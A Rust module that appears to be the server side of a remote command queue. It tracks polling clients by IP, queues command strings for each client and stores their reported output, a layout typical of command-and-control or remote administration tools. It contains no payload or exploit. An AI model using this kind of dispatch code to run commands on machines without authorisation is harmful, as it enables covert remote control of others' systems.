use chrono::{DateTime, Utc};
use serde::{Serialize, Deserialize};
use std::env;

#[derive(Serialize, Deserialize, Debug)]
pub struct Ping {
    pub token: String
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Pong {
    pub token: String,
    pub commands: Vec<Command>
}

#[derive(Serialize, Deserialize, Debug)]
struct Config {
    clients: Vec<Client>,
    commands: Vec<Command>
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Client {
    pub ip: String,
    pub date: DateTime<Utc>
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Command {
    pub ip: String,
    pub command: String,
    pub date: DateTime<Utc>,
    pub output: Option<String>,
}

fn get_config_name() -> String{
    env::var("CONFIG").expect("Config file path must be set")
}

fn get_config() -> Config {
    let config_name = get_config_name();
    let path = std::path::Path::new(&config_name);

    if !path.exists() {
        return Config {
            clients: vec![],
            commands: vec![],
        };
    }

    let contents = std::fs::read_to_string(path).expect("Config must be readable");
    serde_json::from_str(&contents).expect("Config must be valid JSON")
}

fn save_config(config: Config) {
    let config_name = get_config_name();
    let path = std::path::Path::new(&config_name);

    let contents = serde_json::to_string_pretty(&config).expect("Config must be JSON stringable");
    std::fs::write(&path, contents).expect("Config must be writeable");
}

pub fn get_recent_clients() -> Vec<Client> {
    let config = get_config();
    let now = chrono::Utc::now();

    config.clients.into_iter().filter(|x| {
        let difference = now - x.date;
        return difference.num_minutes() <= 1;
    }).collect::<Vec<Client>>()
}

pub fn get_commands_queue_for_ip(ip: &String) -> Vec<Command> {
    let config = get_config();

    config.commands.into_iter()
        .filter(|x| x.output.is_none())
        .filter(|x| x.ip.eq(ip))
        .collect()
}

pub fn get_commands_done_for_ip(ip: &String) -> Vec<Command> {
    let config = get_config();
    let now = chrono::Utc::now();

    config.commands.into_iter()
        .filter(|x| x.output.is_some())
        .filter(|x| x.ip.eq(ip))
        .filter(|x| {
            let difference = now - x.date;
            return difference.num_minutes() <= 30;
        })
        .collect()
}

pub fn add_or_update_client(ip: &String) {
    let mut config = get_config();
    let now = chrono::Utc::now();

    match config.clients.iter_mut().find(|x| x.ip.eq(ip)) {
        Some(client) => {
            client.date = now;
        },
        None => {
            let new_clinet = Client {
                date: now,
                ip: ip.to_owned()
            };

            config.clients.push(new_clinet);
        }
    };

    save_config(config);
}

pub fn add_command_for_ip(ip: String, command: String) {
    let mut config = get_config();

    let now = chrono::Utc::now();

    let new_command = Command {
        command: command,
        date: now,
        ip: ip,
        output: None
    };

    config.commands.push(new_command);

    save_config(config);
}

pub fn update_commands_for_ip(ip: String, command_updates: Vec<Command>) {
    let mut config = get_config();

    for command_update in command_updates {
        let found_command = config.commands.iter_mut()
            .filter(|x| x.ip.eq(&ip))
            .filter(|x| x.output.is_none())
            .filter(|x| x.date.eq(&command_update.date))
            .find(|x| x.command.eq(&command_update.command));

        match found_command {
            Some(found_command) => {
                found_command.output = command_update.output.clone();
            },
            None => {
                println!("Error: Failed to find command");
                println!("\tIP: {}, Command: {}, Output: {}", ip, command_update.command, command_update.output.unwrap_or_default());    
            }
        };
    }

    save_config(config);
}